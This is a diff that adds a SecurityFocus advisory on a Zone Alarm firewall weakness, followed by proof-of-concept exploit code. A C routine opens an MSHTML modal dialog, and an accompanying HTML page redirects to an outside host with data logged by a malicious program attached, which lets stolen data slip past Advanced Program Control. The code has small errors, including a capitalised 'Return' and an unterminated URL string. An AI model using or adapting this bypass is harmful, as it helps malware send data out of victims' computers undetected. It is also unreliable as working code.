@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/15347/info
+
+Zone Labs Zone Alarm is prone to a weakness that permits the bypassing of the Advanced Program Control protection.
+
+Reports indicate that applications can create a modal dialog box displaying HTML, which can then be redirected to a remote site.
+
+This would allow a malicious program to bypass Advanced Program Control protection and send data to a remote attacker from a compromised computer.
+
+It should be noted that this issue only presents itself if the Advanced Program Control setting has been enabled and the browser has been authorized to access the Internet. 
+
+<<< osfwbypass-demo.c >>>
+
+BOOL LoadHtmlDialog(void)
+{
+HINSTANCE hinstMSHTML = LoadLibrary(TEXT("MSHTML.DLL"));
+
+if (hinstMSHTML)
+{
+SHOWHTMLDIALOGFN* pfnShowHTMLDialog;
+
+// Open a Modal Dialog box of HTML content type
+pfnShowHTMLDialog = (SHOWHTMLDIALOGFN*)GetProcAddress(hinstMSHTML,
+TEXT("ShowHTMLDialog"));
+
+if (pfnShowHTMLDialog)
+{
+IMoniker *pURLMoniker;
+
+// Invoke the html file containing the data to be sent via http
+BSTR bstrURL = SysAllocString(L"c:\\modal-dialog.htm");
+CreateURLMoniker(NULL, bstrURL, &pURLMoniker);
+
+if (pURLMoniker)
+{
+(*pfnShowHTMLDialog)(NULL, pURLMoniker, NULL, NULL, NULL);
+pURLMoniker->Release();
+}
+
+SysFreeString(bstrURL);
+}
+
+FreeLibrary(hinstMSHTML);
+}
+
+Return True;
+}
+
+<<< +++ >>>
+
+
+<<< modal-dialog.htm >>>
+<html>
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<title>Redirection Dialog</title>
+
+<script language="JavaScript">
+
+<!-- Here goes the information logged by the malicious program which will
+be sent to the evil site via http request -->
+var sTargetURL =
+"http://www.hackingspirits.com/vuln-rnd/demo/defeat-osfw.asp?[Your
+Information Here]
+window.location.href = sTargetURL;
+window.close;
+</script>
+
+</head>
+</html>
+<<< +++ >>> 
